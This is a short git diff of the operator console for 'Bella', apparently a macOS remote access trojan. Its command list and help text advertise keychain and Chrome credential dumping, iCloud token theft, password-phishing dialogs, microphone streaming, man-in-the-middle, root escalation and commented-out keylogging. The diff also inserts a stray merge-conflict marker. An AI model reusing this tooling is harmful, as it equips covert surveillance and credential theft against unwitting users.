@@ -33,6 +33,7 @@ bluePlus = "%s[*] %s" % (blue, endC)
 yellow_star = "%s[*] %s" % (yellow, endC)
 
 commands = ['iCloud_query', 'bella_version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+<<<<<<< HEAD
 
 def manual():
 	value = "\n%sBella Version%s\nReturn Bella's version / release number.\nUsage: %sbella_version%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
@@ -64,7 +65,6 @@ def manual():
 	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sSubmit Password%s\nUse any of these two functions to try to authenticate as the user.\nUsage: %ssubmit_iCloud_pass\n       submit_local_pass%s\nRequirements: None.\n" % (underline + bold + green, endANSI, bold, endANSI)
 	#value += "\n%sKey Start%s\nBegin keylogging in the background.\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Kill%s\nStop keylogging started through Key Start\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Read%s\nReads the encrypted key log file from Key Start.\nUsage: %skeyRead%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
